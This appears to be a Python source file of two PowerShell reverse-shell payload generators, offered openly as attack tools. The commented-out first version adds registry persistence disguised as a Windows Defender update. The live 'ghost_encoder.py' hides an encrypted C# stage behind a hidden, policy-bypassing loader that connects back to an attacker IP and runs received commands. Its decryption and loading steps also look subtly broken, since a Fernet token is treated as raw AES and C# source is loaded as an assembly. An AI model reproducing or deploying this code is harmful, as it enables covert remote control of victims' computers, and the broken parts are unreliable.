# import base64
# import argparse

# def generate_payload(ip, port):
#     ps_template = r'''
# # Registry persistence (hidden)
# $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
# $cmd = "powershell -ep bypass -e {{BASE64_PAYLOAD}}"
# Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value $cmd -Force

# # Process isolation using WMI
# $code = @"
# using System;
# using System.Diagnostics;
# public class PersistentShell {
#     public static void Main() {
#         while(true) {
#             try {
#                 ProcessStartInfo si = new ProcessStartInfo();
#                 si.FileName = "powershell.exe";
#                 si.Arguments = "-nop -w Hidden -ep bypass -e {{BASE64_PAYLOAD}}";
#                 si.WindowStyle = ProcessWindowStyle.Hidden;
#                 si.CreateNoWindow = true;
#                 Process p = Process.Start(si);
#                 p.WaitForExit();
#             } catch {
#                 System.Threading.Thread.Sleep(30000);
#             }
#         }
#     }
# }
# "@

# Add-Type -TypeDefinition $code -Language CSharp
# [PersistentShell]::Main()
# '''.replace('{{BASE64_PAYLOAD}}', generate_core_payload(ip, port))

#     bytes_script = ps_template.encode('utf-16-le')
#     b64_script = base64.b64encode(bytes_script).decode()
    
#     # return f'powershell -ep bypass -e {b64_script}'
#     return f'Start-Process powershell -ArgumentList "-ep bypass -e {b64_script}"'

# def generate_core_payload(ip, port):
#     core_script = fr'''
# while($true){{
#     try{{
#         $c=New-Object Net.Sockets.TCPClient('{ip}',{port});
#         $s=$c.GetStream();
#         [byte[]]$b=0..65535|%{{0}};
#         while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
#             $d=([text.encoding]::UTF8).GetString($b,0,$i).Trim();
#             if($d -eq "EXIT_XYZ123"){{
#                 $c.Close();
#                 exit;
#             }}
#             $o=(iex $d 2>&1 | Out-String);
#             $o+="PS> ";
#             $s.Write(([text.encoding]::UTF8.GetBytes($o)),0,$o.Length);
#         }}
#         $c.Close()
#     }} catch {{
#         Start-Sleep -Seconds 30
#     }}
# }}
# '''.strip()
    
#     bytes_core = core_script.encode('utf-16-le')
#     return base64.b64encode(bytes_core).decode()

# if __name__ == '__main__':
#     parser = argparse.ArgumentParser()
#     parser.add_argument('-i', '--ip', required=True)
#     parser.add_argument('-p', '--port', type=int, default=2222)
#     args = parser.parse_args()
    
#     payload = generate_payload(args.ip, args.port)
#     print(f"\n[+] Stealth Payload:\n\n{payload}\n")
    
    
# # survives even reboots

# File: ghost_encoder.py
import base64
import argparse
from cryptography.fernet import Fernet

def generate_payload(ip, port):
    # Generate random AES key
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # Stage 1: Polymorphic Loader
    stage1 = fr'''
$k=[System.Convert]::FromBase64String('{key.decode()}');
$iv=$k[0..15];
$enc=[System.Convert]::FromBase64String('{{ENCRYPTED_PAYLOAD}}');
$r=New-Object System.Security.Cryptography.RijndaelManaged;
$r.Key=$k;
$r.IV=$iv;
$d=$r.CreateDecryptor().TransformFinalBlock($enc,0,$enc.Length);
[System.Reflection.Assembly]::Load($d).GetType('Ghost.Shell').GetMethod('Run').Invoke($null,$null);
'''.strip()

    # Stage 2: Memory-Resident Shell (C# Binary)
    stage2_code = f'''
using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace Ghost {{
    public class Shell {{
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        const int SW_HIDE = 0;
        
        public static void Run() {{
            var hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
            
            while(true) {{
                try {{
                    using(TcpClient client = new TcpClient("{ip}", {port})) {{
                        using(NetworkStream stream = client.GetStream()) {{
                            byte[] buffer = new byte[65536];
                            while(true) {{
                                int read = stream.Read(buffer, 0, buffer.Length);
                                if(read == 0) break;
                                
                                string cmd = System.Text.Encoding.UTF8.GetString(buffer, 0, read);
                                if(cmd.Trim() == "EXIT_GHOST") {{
                                    client.Close();
                                    Environment.Exit(0);
                                }}
                                
                                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                                proc.StartInfo.FileName = "powershell.exe";
                                proc.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + cmd;
                                proc.StartInfo.RedirectStandardOutput = true;
                                proc.StartInfo.RedirectStandardError = true;
                                proc.StartInfo.UseShellExecute = false;
                                proc.StartInfo.CreateNoWindow = true;
                                proc.Start();
                                
                                string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                                byte[] response = System.Text.Encoding.UTF8.GetBytes(output);
                                stream.Write(response, 0, response.Length);
                            }}
                        }}
                    }}
                }} catch {{
                    Thread.Sleep(60000);
                }}
            }}
        }}
    }}
}}
'''.encode()
    
    # Encrypt and encode
    encrypted_stage2 = cipher.encrypt(stage2_code)
    stage1 = stage1.replace('{{ENCRYPTED_PAYLOAD}}', base64.b64encode(encrypted_stage2).decode())
    
    # Final encoding
    bytes_stage1 = stage1.encode('utf-16-le')
    return f'''
powershell -w hidden -ep bypass -e {base64.b64encode(bytes_stage1).decode()}
'''.strip()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', required=True)
    parser.add_argument('-p', '--port', type=int, default=443)
    args = parser.parse_args()
    print(f"\n[+] Ghost Payload:\n{generate_payload(args.ip, args.port)}\n")